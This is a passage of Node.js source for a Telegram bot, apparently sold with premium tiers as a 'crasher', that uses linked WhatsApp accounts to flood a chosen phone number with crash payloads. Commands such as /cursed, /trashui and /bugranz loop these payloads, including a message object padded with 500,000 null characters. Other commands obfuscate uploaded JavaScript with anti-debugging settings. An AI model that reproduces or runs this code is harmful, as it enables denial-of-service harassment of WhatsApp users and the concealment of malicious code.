    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  if (!match) {
    return ctx.reply("❌ Missing input. Use: /deltoken <token>");
  }

  const tokenToDelete = match.trim();

  try {
    const response = await axios.get(
      `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`,
      {
        headers: { Authorization: `token ${GITHUB_TOKEN}` },
      }
    );

    const fileContent = Buffer.from(response.data.content, "base64").toString(
      "utf-8"
    );
    const jsonData = JSON.parse(fileContent);

    if (jsonData.tokens.includes(tokenToDelete)) {
      jsonData.tokens = jsonData.tokens.filter(
        (token) => token !== tokenToDelete
      );

      const updatedContent = Buffer.from(
        JSON.stringify(jsonData, null, 2)
      ).toString("base64");
      await axios.put(
        `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`,
        {
          message: "Deleted a Telegram token",
          content: updatedContent,
          sha: response.data.sha,
        },
        { headers: { Authorization: `token ${GITHUB_TOKEN}` } }
      );

      const teks = `Deleted Token Db\nAction By: ${senderId}\nDeleted Token: ${tokenToDelete}`;
      ctx.reply("✅ Token deleted successfully.");

      if (Array.isArray(isOwner)) {
        isOwner.forEach((id) => bot.telegram.sendMessage(id, teks));
      } else {
        bot.telegram.sendMessage(isOwner, teks);
      }

      console.log(
        `Deleted Token Db\nAction By: ${senderId}\nDeleted Token: ${tokenToDelete}`
      );
    } else {
      ctx.reply("⚠️ Token not found.");
    }
  } catch (error) {
    ctx.reply(`❌ Failed to delete token: ${error.message}`);
  }
});
// Command Total Bot Sender
bot.command("status", async (ctx) => {
  if (
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }
  try {
    if (!fs.existsSync(SESSIONS_FILE)) {
      return ctx.reply("Belum ada nomor WhatsApp yang terhubung.");
    }

    const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    if (activeNumbers.length === 0) {
      return ctx.reply("Belum ada nomor WhatsApp yang terhubung.");
    }

    let statusMessage = "╔══════════════════════╗\n";
    statusMessage += "║  LIST WHATSAPP BOT   \n";
    statusMessage += "╠══════════════════════╣\n";

    activeNumbers.forEach((number, index) => {
      statusMessage += `║ ◈ Bot ${index + 1}\n`;
      statusMessage += `║ • Owner: ${number}\n`;
      statusMessage += "╠══════════════════════╣\n";
    });

    statusMessage += `║ Total Bot: ${activeNumbers.length}\n`;
    statusMessage += "╚══════════════════════╝";

    await ctx.reply(statusMessage, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error fetching status:", error);
    ctx.reply("Terjadi kesalahan saat mengambil status bot.");
  }
});
bot.command("enc", async (ctx) => {
  console.log(
    `Perintah diterima: /encrypthard dari pengguna: ${
      ctx.from.username || ctx.from.id
    }`
  );
  const replyMessage = ctx.message.reply_to_message;

  if (
    !replyMessage ||
    !replyMessage.document ||
    !replyMessage.document.file_name.endsWith(".js")
  ) {
    return ctx.reply("😠 Silakan balas file .js untuk dienkripsi.");
  }

  const fileId = replyMessage.document.file_id;
  const fileName = replyMessage.document.file_name;

  // Mendapatkan file dari Telegram
  const fileLink = await ctx.telegram.getFileLink(fileId);
  const response = await axios.get(fileLink.href, {
    responseType: "arraybuffer",
  });
  const codeBuffer = Buffer.from(response.data);

  // Simpan file sementara
  const tempFilePath = `./@hardenc${fileName}`;
  fs.writeFileSync(tempFilePath, codeBuffer);

  // Enkripsi kode menggunakan JsConfuser dengan teknik lebih kuat
  ctx.reply("⚡️ Memproses encrypt hard code . . .");
  const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
    target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: true,
    stringSplitting: 0.2, // Membagi string dalam pecahan lebih kecil
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,
    shuffle: { hash: 1.0, true: 1.0 }, // Mengacak struktur kode
    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 1.0, // Menambahkan kondisi palsu
    deadCode: 1.0, // Menambahkan kode mati
    dispatcher: true,
    rgf: true, // Memperumit referensi global
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true,
    antiDebug: true, // Blokir debugging
    selfDefending: true, // Melindungi dari modifikasi
    debugProtection: true, // Mendeteksi alat debugging
    debuggerFencing: true, // Menghentikan eksekusi jika debugging terdeteksi
    constantMutation: true, // Membuat nilai tetap sulit dipahami
    annotations: true, // Menyertakan anotasi mengganggu decompiler
    virtualization: true, // Mengubah kode menjadi bytecode virtual
    controlFlowFlatteningThreshold: 1.0, // Semua fungsi diproses
    transformObjectKeys: true, // Mengacak nama properti objek
    obfuscationThreshold: 1.0, // Maksimal tingkat obfuscation
  });

  // Simpan hasil enkripsi
  const encryptedFilePath = `./@hardenc${fileName}`;
  fs.writeFileSync(encryptedFilePath, obfuscatedCode);

  // Kirim file terenkripsi ke pengguna
  await ctx.replyWithDocument(
    { source: encryptedFilePath, filename: `encrypted_${fileName}` },
    {
      caption: `╭━━━「 ✅ SUKSES 」━━━⬣\n│ File berhasil dienkripsi!\n│ @bejir\n╰━━━━━━━━━━━━━━━━⬣`,
    }
  );
});
bot.command("enc1", async (ctx) => {
  console.log(
    `Perintah diterima: /enc dari pengguna: ${ctx.from.username || ctx.from.id}`
  );

  const replyMessage = ctx.message.reply_to_message;
  const customName = ctx.message.text.split(" ")[1] || "Laplace"; // Default jika tidak ada nama custom

  if (
    !replyMessage ||
    !replyMessage.document ||
    !replyMessage.document.file_name.endsWith(".js")
  ) {
    return ctx.reply("😠 Silakan balas file .js untuk dienkripsi.");
  }

  const fileId = replyMessage.document.file_id;
  const fileName = replyMessage.document.file_name;

  // Mendapatkan file dari Telegram
  const fileLink = await ctx.telegram.getFileLink(fileId);
  const response = await axios.get(fileLink.href, {
    responseType: "arraybuffer",
  });
  const codeBuffer = Buffer.from(response.data);

  // Simpan file sementara
  const tempFilePath = `./@hardenc${fileName}`;
  fs.writeFileSync(tempFilePath, codeBuffer);

  // Enkripsi kode menggunakan JsConfuser dengan nama custom
  ctx.reply("⚡️ Memproses encrypt hard code . . .");
  const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
    target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    identifierGenerator: function () {
      function randomString(length) {
        let result = "";
        const characters =
          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        for (let i = 0; i < length; i++) {
          result += characters.charAt(
            Math.floor(Math.random() * characters.length)
          );
        }
        return result;
      }
      return customName + randomString(3); // Menambahkan 3 karakter acak untuk mencegah kesamaan
    },
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: true,
    stringSplitting: 0.2,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,
    shuffle: { hash: 1.0, true: 1.0 },
    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 1.0,
    deadCode: 1.0,
    dispatcher: true,
    rgf: true,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true,
    antiDebug: true,
    selfDefending: true,
    debugProtection: true,
    debuggerFencing: true,
    constantMutation: true,
    annotations: true,
    virtualization: true,
    controlFlowFlatteningThreshold: 1.0,
    transformObjectKeys: true,
    obfuscationThreshold: 1.0,
  });

  // Simpan hasil enkripsi
  const encryptedFilePath = `./@hardenc${fileName}`;
  fs.writeFileSync(encryptedFilePath, obfuscatedCode);

  // Kirim file terenkripsi ke pengguna
  await ctx.replyWithDocument(
    { source: encryptedFilePath, filename: `encrypted_${fileName}` },
    {
      caption: `╭━━━「 ✅ SUKSES 」━━━⬣\n│ File berhasil dienkripsi dengan nama: ${customName}\n│ @pace\n╰━━━━━━━━━━━━━━━━⬣`,
    }
  );
});
//func deploy
bot.command("deploy", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }
  if (args.length < 2) {
    return ctx.reply("Gunakan Format:\n`/deploy <token> <ownerId>`", {
      parse_mode: "Markdown",
    });
  }

  const [token, ownerId] = args;
  await deployBot(ctx, token, ownerId);
});
//listdeploy
bot.command("listdeploy", async (ctx) => {
  if (
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  try {
    const bots = getBotList();

    if (bots.length === 0) {
      return ctx.reply("Tidak ada bot yang sedang berjalan.");
    }

    let statusMessage = "<b>╔══════════════════════╗</b>\n";
    statusMessage += "<b>║  LIST TELEGRAM BOTS  </b>\n";
    statusMessage += "<b>╠══════════════════════╣</b>\n";

    bots.forEach((bot, index) => {
      statusMessage += `<b>║ ◈ Bot ${index + 1}</b>\n`;
      statusMessage += `<b>║ • ID: </b><code>${bot.botId}</code>\n`; // HTML escape
      statusMessage += `<b>║ • Owner: </b><code>${bot.ownerId}</code>\n`;
      statusMessage += "<b>╠══════════════════════╣</b>\n";
    });

    statusMessage += `<b>║ Total Bot: ${bots.length}</b>\n`;
    statusMessage += "<b>╚══════════════════════╝</b>";

    await ctx.reply(statusMessage, { parse_mode: "HTML" });
  } catch (error) {
    console.error("Error fetching bot list:", error);
    ctx.reply("Terjadi kesalahan saat mengambil daftar bot.");
  }
});
bot.command("startdeploy", async (ctx) => {
  if (
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  try {
    const bots = getBotList();

    if (bots.length === 0) {
      return ctx.reply("Tidak ada bot yang dideploy untuk dijalankan kembali.");
    }

    let statusMessage = "<b>╔══════════════════════╗</b>\n";
    statusMessage += "<b>║  STARTING ALL BOTS  </b>\n";
    statusMessage += "<b>╠══════════════════════╣</b>\n";

    bots.forEach((bot, index) => {
      // Jalankan kembali setiap bot dengan menggunakan spawn atau exec
      const botDir = path.join(BOTS_DIR, bot.botId);
      const botProcess = spawn("node", ["index.js"], {
        cwd: botDir,
        detached: true,
        stdio: "ignore",
      });

      botProcess.unref(); // Pastikan proses tetap berjalan meskipun bot utama mati

      statusMessage += `<b>║ ◈ Bot ${index + 1}</b>\n`;
      statusMessage += `<b>║ • ID: </b><code>${bot.botId}</code>\n`; // HTML escape
      statusMessage += `<b>║ • Owner: </b><code>${bot.ownerId}</code>\n`;
      statusMessage += "<b>╠══════════════════════╣</b>\n";
    });

    statusMessage += `<b>║ Total Bot: ${bots.length}</b>\n`;
    statusMessage += "<b>╚══════════════════════╝</b>";

    await ctx.reply(statusMessage, { parse_mode: "HTML" });

    ctx.reply("✅ <b>Semua bot berhasil dijalankan kembali!</b>", {
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Error starting bots:", error);
    ctx.reply("Terjadi kesalahan saat menjalankan kembali bot.");
  }
});
//Restart Deploy
const donerespone = async (target, ctx) => {
  const caption = `Succesfully`;

  await ctx
    .reply(caption)
    .then(() => {
      console.log("Done response sent");
    })
    .catch((error) => {
      console.error("Error sending done response:", error);
    });
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net",
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT",
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(
          500000
        )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3,
      },
    },
  },
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

// --- Command /show (Placeholder for your actual crash functions) ---

bot.command("cd", async (ctx) => {
  const userId = ctx.from.id;

  if (!cooldownUsers.has(userId)) {
    return await ctx.reply(
      "Tidak ada cooldown aktif untuk Anda. Anda dapat menggunakan perintah sekarang."
    );
  }

  const remainingTime = Math.ceil(
    (cooldownUsers.get(userId) - Date.now()) / 1000
  );

  if (remainingTime > 0) {
    return await ctx.reply(
      `Cooldown aktif. Harap tunggu ${remainingTime} detik sebelum menggunakan perintah lagi.`
    );
  } else {
    cooldownUsers.delete(userId);
    return await ctx.reply(
      "Cooldown Anda sudah selesai. Anda dapat menggunakan perintah sekarang."
    );
  }
});

//
bot.command("cursed", checkPremium, async (ctx) => {
  const userId = ctx.from.id;

  // Cek apakah pengguna dalam cooldown
  if (cooldownUsers.has(userId)) {
    const remainingTime = Math.ceil(
      (cooldownUsers.get(userId) - Date.now()) / 1000
    );
    return await ctx.reply(
      `Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`
    );
  }

  // Atur cooldown 60 detik
  const cooldownDuration = 60000;
  cooldownUsers.set(userId, Date.now() + cooldownDuration);

  setTimeout(() => {
    cooldownUsers.delete(userId);
  }, cooldownDuration);

  // Parsing teks setelah perintah
  const match = ctx.message.text.split(" ").slice(1).join(" ");
  if (!match) {
    return ctx.reply("Gunakan format: /cursed <nomor target> <pesan>");
  }

  const [targetNumber, ...messageWords] = match.split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect"
      );
    }

    const statusMessage = await ctx.reply(
      `┏━━━━━━━━━━━━━━━━━━━━━
┃        NEBULA CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : CURSED
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 5; i++) {
          await Bug2(sock, target);
          await nebula(sock, target);
          await noclick(sock, target);
          await InvisiPayload(sock, target);
          await Payload(sock, target);
          await noclick(sock, target);
          await nebula(sock, target);
        }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null,
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃       NEBULA CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : CURSED
┃ SUCCESS : ${successCount}
┃ FAILED : ${failCount}
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});
bot.command("trashui", checkPremium, async (ctx) => {
  const userId = ctx.from.id;

  // Cek apakah pengguna dalam cooldown
  if (cooldownUsers.has(userId)) {
    const remainingTime = Math.ceil(
      (cooldownUsers.get(userId) - Date.now()) / 1000
    );
    return await ctx.reply(
      `Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`
    );
  }

  // Atur cooldown 60 detik
  const cooldownDuration = 20000;
  cooldownUsers.set(userId, Date.now() + cooldownDuration);

  setTimeout(() => {
    cooldownUsers.delete(userId);
  }, cooldownDuration);

  // Parsing teks setelah perintah
  const match = ctx.message.text.split(" ").slice(1).join(" ");
  if (!match) {
    return ctx.reply("Gunakan format: /trashui <nomor target>");
  }

  const [targetNumber, ...messageWords] = match.split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect"
      );
    }

    const statusMessage = await ctx.reply(
      `┏━━━━━━━━━━━━━━━━━━━━━
┃        NEBULA CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : TRASHUI
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 15; i++) {
          await crashui(sock, target);
        }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null,
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃       NEBULA CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : TRASHUI
┃ SUCCESS : ${successCount}
┃ FAILED : ${failCount}
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});
bot.command("bugranz", checkPremium, async (ctx) => {
  const userId = ctx.from.id;

  // Cek apakah pengguna dalam cooldown
  if (cooldownUsers.has(userId)) {
    const remainingTime = Math.ceil(
      (cooldownUsers.get(userId) - Date.now()) / 1000
    );
    return await ctx.reply(
      `Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`
    );
  }

  // Atur cooldown 60 detik
  const cooldownDuration = 90000;
  cooldownUsers.set(userId, Date.now() + cooldownDuration);

  setTimeout(() => {
    cooldownUsers.delete(userId);
  }, cooldownDuration);

  // Parsing teks setelah perintah
  const match = ctx.message.text.split(" ").slice(1).join(" ");
  if (!match) {
    return ctx.reply("Gunakan format: /cursed <nomor target> <pesan>");
  }

  const [targetNumber, ...messageWords] = match.split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect"
      );
    }

    const statusMessage = await ctx.reply(
      `┏━━━━━━━━━━━━━━━━━━━━━
┃        RANZ CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : VORTEX
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 3; i++) {
          await TagNull(sock, target);
          await blank(sock, target);
          await freeze(sock, target);
          await hardui1(sock, target);
          await hard3(sock, target);
          await blank(sock, target);
          await InvisiPayload(sock, target);
        }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null,
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃       RANZ CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : VORTEX
┃ SUCCESS : ${successCount}
┃ FAILED : ${failCount}
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});
bot.command('grouponly', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = true;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Bot diatur untuk hanya merespon di Grup!
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});
const checkChatType = (ctx, next) => {
  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
    ctx.reply('❌ Command ini hanya dapat digunakan di grup.');
    return;
  }

  if (botForPrivateChat && ctx.chat.type !== 'private') {
    ctx.reply('❌ Command ini hanya dapat digunakan di private chat.');
    return;
  }

  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
};
bot.use((ctx, next) => {
  // Set variabel global untuk menentukan tipe bot
  botForGroup = true; // Hanya untuk grup
  botForPrivateChat = false; // Tidak untuk private chat

  // Gunakan middleware
  checkChatType(ctx, next);
});
bot.command("ranzv1", checkPremium, async (ctx) => {
  const userId = ctx.from.id;

  // Cek apakah pengguna dalam cooldown
  if (cooldownUsers.has(userId)) {
    const remainingTime = Math.ceil(
      (cooldownUsers.get(userId) - Date.now()) / 1000
    );
    return await ctx.reply(
      `Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`
    );
  }

  // Atur cooldown 60 detik
  const cooldownDuration = 90000;
  cooldownUsers.set(userId, Date.now() + cooldownDuration);

  setTimeout(() => {
    cooldownUsers.delete(userId);
  }, cooldownDuration);

  // Parsing teks setelah perintah
  const match = ctx.message.text.split(" ").slice(1).join(" ");
  if (!match) {
    return ctx.reply("Gunakan format: /trashui <nomor target>");
  }

  const [targetNumber, ...messageWords] = match.split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect"
      );
    }

    const statusMessage = await ctx.reply(
      `┏━━━━━━━━━━━━━━━━━━━━━
┃        RANZ CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : INVIOS
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 30; i++) {
          await InvisiPayload(sock, target);
        }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null,
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃       RANZ CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : INVIOS
┃ SUCCESS : ${successCount}
┃ FAILED : ${failCount}
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});
bot.command("ranzbug", async (ctx) => {
  const userId = ctx.from.id;

  // Cek apakah pengguna dalam cooldown
  if (cooldownUsers.has(userId)) {
    const remainingTime = Math.ceil(
      (cooldownUsers.get(userId) - Date.now()) / 1000
    );
    return await ctx.reply(
      `Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`
    );
  }

  // Atur cooldown 60 detik
  const cooldownDuration = 90000;
  cooldownUsers.set(userId, Date.now() + cooldownDuration);

  setTimeout(() => {
    cooldownUsers.delete(userId);
  }, cooldownDuration);

  // Parsing teks setelah perintah
  const match = ctx.message.text.split(" ").slice(1).join(" ");
  if (!match) {
    return ctx.reply("Gunakan format: /trashui <nomor target>");
  }

  const [targetNumber, ...messageWords] = match.split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect"
      );
    }

    const statusMessage = await ctx.reply(
      `┏━━━━━━━━━━━━━━━━━━━━━
┃        RANZ CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : INVIOS
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 3; i++) {
          await TagNull(sock, target);
          await blank(sock, target);
          await freeze(sock, target);
          await hardui1(sock, target);
          await hard3(sock, target);
          await blank(sock, target);
          await InvisiPayload(sock, target);
        }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null,
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃       RANZ CRASHER
┣━━━━━━━━━━━━━━━━━━━━━
┃ TARGET : ${formattedNumber}
┃ TYPE : INVIOS
┃ SUCCESS : ${successCount}
┃ FAILED : ${failCount}
┃ TOTAL NUMBER : ${sessions.size}
┗━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});
//foto
const photoUrls = [
  "https://img86.pixhost.to/images/382/561078759_uploaded_image.jpg",
];
// Fungsi untuk memilih foto secara acak
function getRandomPhoto() {
  const randomIndex = Math.floor(Math.random() * photoUrls.length);
  return photoUrls[randomIndex];
}
//Menu Start
async function sendMainMenu(ctx) {
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const randomPhoto = getRandomPhoto();
  const buttons = Markup.inlineKeyboard([
    [
      Markup.button.callback("𝐏𝐫𝐞𝐦𝐢𝐮𝐦", "option1"),
      Markup.button.callback("𝑪𝐨𝐧𝐭𝐫𝐨𝐥𝐥", "option2"),
    ],
  ]);
  await ctx.replyWithPhoto(getRandomPhoto(), {
    caption: `
╭───── ⧼ RanZbugtelebot ⧽
│ ᴄʀᴇᴀᴛᴏʀ : Ranz
│ ᴠᴇʀsɪ : ʙᴇᴛᴀ
│ ᴏs : ʟɪɴᴜx
│ ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
╰─────
╭───── ⧼ 𝑨 𝑪 𝑪 𝑬 𝑺 𝑺 ⧽
│ ᴀᴅᴍɪɴ : ${isAdminStatus ? "✅" : "❌"}
│ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
╰─────
╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
│ /bugranz
│ /ranzv1
╰─────
    `,
    parse_mode: "Markdown",
    reply_markup: buttons.reply_markup,
  });
}

bot.start(async (ctx) => {
  await sendMainMenu(ctx);
});
async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: getRandomPhoto(),
        caption,
        parse_mode: "Markdown",
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error("Error editing menu:", error);
    await ctx.reply("Maaf, terjadi kesalahan saat mengedit pesan.");
  }
}
// Action untuk tampilkan kembali menu utama
bot.action("startmenu", async (ctx) => {
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const randomPhoto = getRandomPhoto();
  const buttons = Markup.inlineKeyboard([
    // Baris pertama: BugMenu dan OwnerMenu
    [
      Markup.button.callback("𝐏𝐫𝐞𝐦𝐢𝐮𝐦", "option1"),
      Markup.button.callback("𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐥", "option2"),
    ],
  ]);
  const caption = `
╭───── ⧼ RanZbugtelebot ⧽
│ᴄʀᴇᴀᴛᴏʀ : Ranz
│ᴠᴇʀsɪ : ʙᴇᴛᴀ
│ᴏs : ʟɪɴᴜx
│ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
╰─────
╭───── ⧼ 𝑨 𝑪 𝑪 𝑬 𝑺 𝑺 ⧽
│ ᴀᴅᴍɪɴ : ${isAdminStatus ? "✅" : "❌"}
│ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
╰─────
╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
│ /bugranz
│ /ranzv1
╰─────
`;

